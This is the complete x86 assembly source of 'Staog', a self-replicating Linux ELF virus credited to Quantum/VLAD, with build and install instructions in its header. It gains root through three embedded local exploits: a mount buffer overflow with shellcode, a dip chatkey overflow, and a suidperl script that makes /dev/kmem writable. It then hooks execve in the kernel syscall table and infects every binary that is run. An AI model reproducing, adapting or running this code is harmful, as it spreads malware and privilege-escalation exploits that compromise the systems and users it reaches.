#  +-----------------------------------------------------------------+
#  |                            S T A O G                            |
#  |                                                                 |
#  |          yo ho.. welcome to yet another attempt at the          |
#  |        impossible and improbable.  This virus is a fully        |
#  |       resident linux elf infector.  It will infect files        |
#  |           on execute regardless of who executed them.           |
#  |         It achieves this by hacking root via 3 separate         |
#  |     exploits and installing itself in the kernel.  It leaves    |
#  |        no trace of itself in drop files or other noticable      |
#  |          locations but contains no stealth of any type.         |
#  |                                                                 |
#  |       This is not a script virus.  It is written in 100%        |
#  |       at&t style asm.  To compile:                              |
#  |                                                                 |
#  |                   gcc vircode.s -o vircode                      |
#  |                   strip vircode                                 |
#  |                                                                 |
#  |   The filesize should be 4744 bytes.  If not put the filesize   |
#  |        in the .long at 'filesize:' and recompile and strip.     |
#  |          Then execute to install.  After installation the       |
#  |         generated binary will automatically be deleted.         |
#  |                                                                 |
#  |   For some reason this virus will only work on ELF machines     |
#  |       running the 1.2.13 kernel.                                |
#  |                                                                 |
#  |                    Q U A N T U M  /  V L A D                    |
#  +-----------------------------------------------------------------+

.text
.global vircode
vircode:                                  # start of the virus
	pushl $0                          # entry point
	pushl %ebp                        # setup stack frame
	movl %esp,%ebp
	pusha                             # save all regs
	movl $125,%eax                    # make cs writable
	movl $0x8000000,%ebx
	movl $0x4000,%ecx
	movl $7,%edx
	int $0x80
	call recalc                       # dynamic relocation  
recalc:
	pop %edx
	subl $recalc,%edx
	leal vircode(%edx),%eax           # store entrypoint
	movl %eax,4(%ebp)                 

	movl $11,%eax                     # are we already resident ?
	movl $0x666,%ebx
	int $0x80
	cmp $0x667,%ebx
	jnz goresident
	jmp ret2host
goresident:
	movl 12(%ebp),%ebx                # open argv[0]
	xorl %ecx,%ecx
	movl $5,%eax
	int $0x80
	or %eax,%eax
	js ohfuck
	movl %eax,%ebx

	movl $19,%eax                     # seek to vircode
	movl $vircode-main,%ecx           
	subl filesize(%edx),%ecx
	pushl %edx
	movl $2,%edx
	int $0x80
	popl %edx

	subl filesize(%edx),%esp          

	movl $3,%eax                      # read in vircode
	movl %esp,%ecx
	pushl %edx
	movl filesize(%edx),%edx                   
	int $0x80
	popl %edx

	movl $6,%eax                      # close argv
	int $0x80       

	movl $5,%eax                      # open tmp name for virus body
	leal virname(%edx),%ebx
	movl $577,%ecx
	pushl %edx
	movl $448,%edx
	int $0x80
	popl %edx
	movl %eax,%ebx
	
	movl $4,%eax                     # write vircode
	movl %esp,%ecx
	pushl %edx
	movl filesize(%edx),%edx                  
	int $0x80
	popl %edx

	movl $6,%eax                     # close tmp
	int $0x80

	addl filesize(%edx),%esp                  

	movl $2,%eax                         # fork
	int $0x80
	orl %eax,%eax
	jne ret2host

	movl $36,%eax                        # sync
	int $0x80

	leal virname(%edx),%ebx              # exec the virus
	leal virargs(%edx),%ecx
	movl %ebx,(%ecx)
	movl 8(%ebp),%eax
	shll $2,%eax
	leal 16(%ebp),%edx
	addl %eax,%edx
	movl $11,%eax
	int $0x80
	movl $1,%eax
	int $0x80
# return to host
ret2host:
	movl 12(%ebp),%ebx                # open argv[0]
	xorl %ecx,%ecx
	movl $5,%eax
	int $0x80
	or %eax,%eax
	js ohfuck
	movl %eax,%ebx
	movl %esp,%edi                    # allocate space for return frame 
	subl $endstackexecode-stackexecode+50,%edi
	leal stackexecode(%edx),%esi      # copy return frame to stack
	movl $endstackexecode-stackexecode,%ecx
	pushl %edi
	rep
	movsb
	movl $19,%eax                     # move to original bytes in argv[0]
	movl $vircode-main,%ecx
	pushl %edx
	movl $2,%edx
	int $0x80
	popl %edx
	movl $3,%eax                      # ready to read in org bytes 
	leal vircode(%edx),%ecx
	movl $main-vircode,%edx
	ret                               # goto return frame

ohfuck:
	movl $1,%eax
	int $0x80
  
stackexecode:                             # executed on the stack
	int $0x80                         # retreive original bytes
	movl $6,%eax
	int $0x80                         # close file handle
	popa                              # restore all registers
	pop %ebp                          # restore stack
	ret                               # return to host
endstackexecode:

filesize:
.long 4744

st:
.long 0

virname:
.string "/tmp/hookup"

virargs:
.long 0
.long 0

.string "Staog by Quantum / VLAD"

.global main
main:
	movl %esp,%ebp
	movl $11,%eax                     # are we already resident ?
	movl $0x666,%ebx
	int $0x80
	cmp $0x667,%ebx
	jnz goresident1
	jmp tmpend
goresident1:
	movl $125,%eax                    # make cs writable
	movl $0x8000000,%ebx
	movl $0x4000,%ecx
	movl $7,%edx
	int $0x80
	movl $130,%eax                    # get num kernel syms
	movl $0,%ebx
	int $0x80
	shll $6,%eax
	subl %eax,%esp
	movl %esp,%esi
	pushl %eax
	movl %esi,%ebx                    # get kernel syms
	movl $130,%eax
	int $0x80
	pushl %esi      
nextsym1:                                  # find symbol
	movl $thissym1,%edi
	push %esi
	addl $4,%esi
	cmpb $95,(%esi)
	jnz notuscore
	incl %esi
notuscore:
	cmpsl
	cmpsl
	pop %esi
	jz foundsym1
	addl $64,%esi
	jmp nextsym1
foundsym1:
	movl (%esi),%esi
	movl %esi,current
	popl %esi

	pushl %esi      
nextsym2:                                  # find symbol
	movl $thissym2,%edi
	push %esi
	addl $4,%esi
	cmpsl
	cmpsl
	pop %esi
	jz foundsym2
	addl $64,%esi
	jmp nextsym2
foundsym2:
	movl (%esi),%esi
	movl %esi,kmalloc
	popl %esi

	xorl %ecx,%ecx
nextsym:                                  # find symbol
	movl $thissym,%edi
	movb $15,%cl
	push %esi
	addl $4,%esi
	rep 
	cmpsb
	pop %esi
	jz foundsym
	addl $64,%esi
	jmp nextsym
foundsym:
	movl (%esi),%esi
	pop %eax
	addl %eax,%esp

	movl %esi,syscalltable
	xorl %edi,%edi
	
opendevkmem:
	movl $devkmem,%ebx           # open /dev/kmem
	movl $2,%ecx
	call openfile
	orl %eax,%eax
	js haxorroot
	movl %eax,%ebx

	leal 44(%esi),%ecx                # lseek to sys_call_table[SYS_execve]
	call seekfilestart
	
	movl $orgexecve,%ecx         # read in execve pointer
	movl $4,%edx
	call readfile

	leal 488(%esi),%ecx               # seek to sys_call_table[SYS_uname]
	call seekfilestart

	movl $taskptr,%ecx           # read in sys_call_table[SYS_uname]
	movl $4,%edx
	call readfile
	
	movl taskptr,%ecx           # seek to uname code
	call seekfilestart

	subl $endhookspace-hookspace,%esp
	
	movl %esp,%ecx                    # read in org uname bytes
	movl $endhookspace-hookspace,%edx
	call readfile
	
	movl taskptr,%ecx           # seek to uname code
	call seekfilestart

	movl filesize,%eax                # amount to alloc
	addl $virend-vircode,%eax
	movl %eax,virendvircodefilesize

	movl $hookspace,%ecx         # write our code
	movl $endhookspace-hookspace,%edx
	call writefile

	movl $122,%eax                    # call uname to alloc some space
	int $0x80
	movl %eax,codeto
	
	movl taskptr,%ecx                 # seek to uname code
	call seekfilestart

	movl %esp,%ecx                    # write org uname bytes
	movl $endhookspace-hookspace,%edx
	call writefile
	
	addl $endhookspace-hookspace,%esp

	subl $aftreturn-vircode,orgexecve       

	movl codeto,%ecx                  # seek to buffer
	subl %ecx,orgexecve
	call seekfilestart

	movl $vircode,%ecx                # write vircode
	movl $virend-vircode,%edx
	call writefile

	subl filesize,%esp                # read in virus      
	pushl %ebx
	movl 8(%ebp),%ebx
	movl (%ebx),%ebx
	xorl %ecx,%ecx
	call openfile
	movl %eax,%ebx
	leal 4(%esp),%ecx
	movl filesize,%edx                      
	call readfile
	call closefile
	popl %ebx

	movl %esp,%ecx                    # write virus to end of alloc space
	movl filesize,%edx                      
	call writefile

	addl filesize,%esp                      

	leal 44(%esi),%ecx                # seek to sys_call_table[SYS_execve]
	call seekfilestart

	addl $newexecve-vircode,codeto

	movl $codeto,%ecx                 # write pointer to execve handler
	movl $4,%edx
	call writefile

	call closefile                    # close file

tmpend:
	movl 8(%ebp),%ebx                 # rm argv[0]
	movl (%ebx),%ebx
	call rmfile
	call exit

openfile:
	movl $5,%eax
	int $0x80
	ret

closefile:
	movl $6,%eax
	int $0x80
	ret

readfile:
	movl $3,%eax
	int $0x80
	ret

writefile:
	movl $4,%eax
	int $0x80
	ret

seekfilestart:
	movl $19,%eax
	xorl %edx,%edx
	int $0x80
	ret

rmfile:
	movl $10,%eax
	int $0x80
	ret


exit:
	xorl %eax,%eax
	incl %eax
	int $0x80

waitchild:
	movl $7,%eax
	movl $-1,%ebx
	movl $st,%ecx
	xorl %edx,%edx
	int $0x80
	ret



haxorroot:                                # this routine makes /dev/kmem a+wr
	cmpl $3,%edi
	jz ret2host
	movl $2,%eax                      # fork()
	int $0x80
	orl %eax,%eax                     # are we the child or parent
	jnz parent
	xorl %ebx,%ebx                    # close stdin
	call closefile  
	movl $1,%ebx                      # close stdout
	call closefile  
	movl $2,%ebx                      # close stderr
	call closefile
	cmpl $1,%edi                      # try sploit 1
	jz sploit1
	cmpl $2,%edi                      # try sploit 2
	jz sploit2
	movl $2,%eax                      # try sploit 3
	int $0x80                         # fork
	orl %eax,%eax   
	jne notc1
	movl $2,%eax                      # fork
	int $0x80
	orl %eax,%eax
	jne notc2
	movl $4,r
	jmp allgo
notc2:
	call waitchild                    # wait for child
	movl $8,r
	jmp allgo
notc1:
	call waitchild                    # wait for child
	movl $0,r
allgo:
	subl $1029,%esp                   # allocate space for egg
	mov %esp,%edi
	movl $1028-60,%ecx
	subl r,%ecx
	movb $0x90,%al                    # add nops to egg
	rep
	stosb
	movl $execshell,%esi              # add shell to egg
	movl $60,%ecx
	rep
	movsb
	movl %esp,%eax                    # add return address
	addl $1200,%eax
	stosl
	xorl %eax,%eax
	stosb
	movl $11,%eax                     # execute mount sploit
	movl $mountpath,%ebx
	movl $args,%ecx
	movl %esp,4(%ecx)
	movl $env,%edx
	int $0x80
	call exit

execshell:
.string "\xeb\x21\x5b\x31\xc9\x66\xb9\xff\x01\x31\xc0\x88\x43\x09\x88\x43\x14\xb0\x0f\xcd\x80\x31\xc0\xb0\x0a\x8d\x5b\x0a\xcd\x80\x33\xc0\x40\xcd\x80\xe8\xda\xff\xff\xff/dev/kmemx/etc/mtab~"
mountpath:
.string "/sbin/mount"
r:
.long 0
args:
.long mountpath
.long 0
.long 0
env:
.long 0

dipname:
.string "/tmp/t.dip"
execthis:
.string "/bin/sh"
parm1:
.string "-c"
pathdip:
.string "/sbin/dip /tmp/t.dip"
args1:
.long execthis
.long parm1
.long pathdip
.long 0
chkey:
.string "chatkey "
hsname:
.string "/tmp/hs"
hsdat:
.string "#!/bin/sh\nchmod 666 /dev/kmem\n"
shell:
.string "\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff/tmp/hs"
sploit1:
	subl $1024,%esp                  # allocate space for egg
	movl %esp,%edi
	movl $chkey,%esi                 # add "chatkey " to egg
	movsl
	movsl
	movl %esp,%eax
	subl $224,%eax                   # add return address to egg
	movl $34,%ecx
	rep
	stosl
	movl $512-144,%ecx               # add nops to egg
	movb $0x90,%al
	rep
	stosb
	movl $shell,%esi                 # add shell to egg
	movl $50,%ecx
	rep
	movsb
	movl $10,%al                     # add \n to egg
	stosb
	movl $dipname,%ebx               # create dip script
	movl $577,%ecx
	movl $448,%edx
	call openfile
	movl %eax,%ebx
	movl %esp,%ecx
	pushl %edx
	movl $562,%edx                   # write script code
	call writefile
	popl %edx
	call closefile        
	movl $hsname,%ebx                # create shell file to execute
	movl $577,%ecx
	movl $448,%edx
	call openfile
	movl %eax,%ebx
	movl $hsdat,%ecx
	movl $30,%edx
	call writefile                   # write shell contents
	call closefile        
	movl $2,%eax                     # fork
	int $0x80
	orl %eax,%eax
	jne p1
	movl $execthis,%ebx              # execute sploit
	movl $args1,%ecx
	movl 12(%ebp),%edx
	movl $11,%eax
	int $0x80
	call exit        
p1:     call waitchild                   # wait for sploit to finish
	movl $dipname,%ebx               # remove dip script
	call rmfile
	movl $hsname,%ebx                # remove shell script
	call rmfile
	call exit

perlname:
.string "/tmp/b"

perldat:
.string "#!/usr/bin/suidperl -U\n$ENV{PATH}=\"/bin:/usr/bin\";\n$>=0;$<=0;\nexec(\"chmod 666 /dev/kmem\");\n"

perlargs:
.long perlname
perlenv:
.long 0

sploit2:
	movl $perlname,%ebx                  # create perl script
	movl $577,%ecx
	movl $488,%edx
	call openfile
	movl %eax,%ebx
	movl $perldat,%ecx                   # write perl contents
	movl $91,%edx
	call writefile
	movl $94,%eax
	movl $2496,%ecx
	int $0x80
	call closefile        
	movl $2,%eax                         # fork
	int $0x80
	orl %eax,%eax
	jne p2
	movl $11,%eax                        # execute the sploit
	movl $perlname,%ebx
	movl $perlargs,%ecx
	movl $perlenv,%edx
	int $0x80
	call exit       
p2:
	call waitchild                       # wait for the child
	movl $perlname,%ebx                  # remove perl script
	call rmfile
	call exit       

parent: 
	incl %edi
	call waitchild  # wait for child process to finish
	jmp opendevkmem

taskptr:
.long 0

otaskptr:
.long 0

codeto:
.long 0

thissym:
.string "sys_call_table"

thissym1:
.string "current"

thissym2:
.string "kmalloc"

devkmem:
.string "/dev/kmem"

e_entry:
.long 0x666

infect:                                   # opens and infects the file in %ebx
	pushl $2                          # open %ebx
	pushl %ebx 
	call 5*4(%ebp)
	popl %ebx
	popl %ebx
	orl %eax,%eax                     # make sure it's opened
	js e1
	movl %eax,%ebx
	push %fs
	push %ds
	pop %fs
	leal e_entry(%edi),%ecx                 # read in elf hdr marker
	movl $4,%edx
	pushl %edx
	pushl %ecx
	pushl %ebx
	call 3*4(%ebp)  
	addl $12,%esp
	cmpl $0x464c457f,e_entry(%edi)          # make sure it's elf
	jnz e2
	pushl $0                                # seek to entrypoint storage
	pushl $24
	pushl %ebx
	call 19*4(%ebp)
	addl $12,%esp
	leal e_entry(%edi),%ecx                 # read the entrypoint
	pushl $4
	pushl %ecx
	pushl %ebx
	call 3*4(%ebp)
	addl $12,%esp
	andl $0xffff,e_entry(%edi)
	movl e_entry(%edi),%ecx               # seek to entrypoint
	pushl $0
	pushl %ecx
	pushl %ebx
	call 19*4(%ebp)
	popl %eax
	popl %eax
	popl %eax
	subl $main-vircode,%esp               # allocate space on the stack
	movl %esp,%esi
	pushl $main-vircode                     # read in host bytes
	pushl %esi
	pushl %ebx
	call 3*4(%ebp)
	addl $12,%esp
	movl vircode(%edi),%eax
	cmpl %eax,(%esi)                        # check if file infected
	jz e3

	pushl $2                                # seek to end of file
	pushl $0
	pushl %ebx
	call 19*4(%ebp) 
	addl $12,%esp
	movl filesize(%edi),%eax
	pushl %eax                              
	leal virend(%edi),%eax                  # write virus body to end
	pushl %eax
	pushl %ebx
	call 4*4(%ebp)
	addl $12,%esp
	pushl $2                                # seek to end of file
	pushl $0
	pushl %ebx
	call 19*4(%ebp) 
	addl $12,%esp
	pushl $main-vircode                   # write org bytes
	pushl %esi
	pushl %ebx
	call 4*4(%ebp)  
	addl $12,%esp
	movl e_entry(%edi),%ecx                 # seek to entrypoint
	pushl $0
	pushl %ecx
	pushl %ebx
	call 19*4(%ebp)
	addl $12,%esp
	leal vircode(%edi),%ecx                 # write virus
	pushl $main-vircode
	pushl %ecx
	pushl %ebx
	call 4*4(%ebp)
	addl $12,%esp
e3:
	addl $main-vircode,%esp               # deallocate space off stack
e2:
	pop %fs
	pushl %ebx
	call 6*4(%ebp)                          # close file
	popl %eax
	call 36*4(%ebp)                         # sync
e1:
	ret

uidsave:
.word 0
euidsave:
.word 0
suidsave:
.word 0
fsuidsave:
.word 0

gidsave:
.word 0
egidsave:
.word 0
sgidsave:
.word 0
fsgidsave:
.word 0

saveuids:
	movl current(%edi),%eax
	movl (%eax),%eax
	leal 0x310(%eax),%esi
	pushl %edi
	leal uidsave(%edi),%edi
	movl $4,%ecx
	rep
	movsl
	popl %edi
	ret

makeroot:
	movl current(%edi),%eax
	movl (%eax),%eax
	pushl %edi
	leal 0x310(%eax),%edi
	xorl %eax,%eax
	movl $4,%ecx
	rep
	stosl
	popl %edi
	ret

loaduids:
	movl current(%edi),%eax
	movl (%eax),%eax
	leal uidsave(%edi),%esi
	pushl %edi
	leal 0x310(%eax),%edi
	movl $4,%ecx
	rep
	movsl
	popl %edi
	ret

.global newexecve
newexecve:
	pushl %ebp
	movl %esp,%ebp
	pushl %ebx
	movl 8(%ebp),%ebx                   # get the filename to infect
	pushal
	cmpl $0x666,%ebx                    # is this our service routine ?
	jnz notserv
	popal
	incl 8(%ebp)                        # yes..inc the pointer and return
	popl %ebx
	popl %ebp
	ret
notserv:
	call ring0recalc                    # no.. calculate ring 0 delta
ring0recalc:
	popl %edi
	subl $ring0recalc,%edi
	movl syscalltable(%edi),%ebp        # put *sys_call_table in %ebp
	call saveuids                       # save the callers uid/euid...
	call makeroot                       # make the caller root
	call infect                         # infect the file
	call loaduids                       # restore the callers uid/euid...
hookoff:
	popal
	popl %ebx
	popl %ebp
.byte   0xe9                                # goto original execve
orgexecve:
.long   0
aftreturn:

syscalltable:
.long 0

current:
.long 0

.global hookspace
hookspace:
	push %ebp
	pushl %ebx
	pushl %ecx
	pushl %edx
	movl %esp,%ebp

	pushl $3
.byte   0x68
virendvircodefilesize:
.long   0
.byte   0xb8               # movl $xxx,%eax     
kmalloc:
.long   0
	call %eax

	movl %ebp,%esp
	popl %edx
	popl %ecx
	popl %ebx
	popl %ebp       
	ret     

.global endhookspace
endhookspace:
.global virend
virend:

